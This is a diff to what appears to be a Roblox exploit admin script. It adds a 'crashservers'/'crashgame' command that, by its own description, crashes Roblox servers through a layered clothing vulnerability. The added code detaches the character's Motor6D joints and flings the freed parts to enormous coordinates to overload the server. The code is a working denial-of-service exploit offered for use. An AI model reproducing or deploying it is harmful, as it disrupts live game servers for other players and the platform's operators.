@@ -6569,6 +6569,17 @@ newCmd("fakeout", {}, "fakeout", "Teleport into the void and teleport back up (g
 	end
 end)
 
+newCmd("crashservers", {"crashgame"}, "crashservers / crashgame", "Crash Roblox servers with a layered clothing vulnerability", function(args, speaker)
+	for i, v in next, GetDescendants(speaker.Character) do
+		if IsA(v, "Motor6D") and tostring(v.Name) ~= "Neck" then
+			local object = v.Parent
+			Destroy(v)
+			object.CFrame = CFrame.new(9e9 * i, 9e9 * i, 9e9 * i)
+			wait()
+		end
+	end
+end)
+
 
 
 
